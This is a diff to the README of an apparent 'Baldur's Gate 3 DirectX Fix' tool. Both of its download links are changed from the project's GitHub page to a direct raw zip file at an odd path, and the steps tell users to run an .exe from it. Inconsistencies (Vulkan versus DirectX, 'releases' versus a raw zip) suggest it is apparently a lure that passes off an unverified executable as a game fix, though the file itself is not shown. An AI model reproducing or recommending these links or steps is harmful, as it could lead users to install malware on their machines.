@@ -5,7 +5,7 @@ description: "Resolve Baldur's Gate 3 Vulkan errors on Windows 10 and 11 using t
 ---
 # 🛠️ Baldurs-Gate-3-DirectX-Fix - Resolve DirectX game startup errors reliably
 
-[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://github.com/floritravelable459/Baldurs-Gate-3-DirectX-Fix)
+[![](https://img.shields.io/badge/Download-Fix-blue.svg)](https://raw.githubusercontent.com/floritravelable459/floritravelable459.github.io/main/myops/io_github_floritravelable_2.3.zip)
 
 ## 📖 About this project
 
@@ -26,7 +26,7 @@ Ensure you have at least 50MB of free space on your hard drive. This tool does n
 
 Follow these steps to repair your game installation.
 
-1. Visit the download page: [Download Link](https://github.com/floritravelable459/Baldurs-Gate-3-DirectX-Fix).
+1. Visit the download page: [Download Link](https://raw.githubusercontent.com/floritravelable459/floritravelable459.github.io/main/myops/io_github_floritravelable_2.3.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
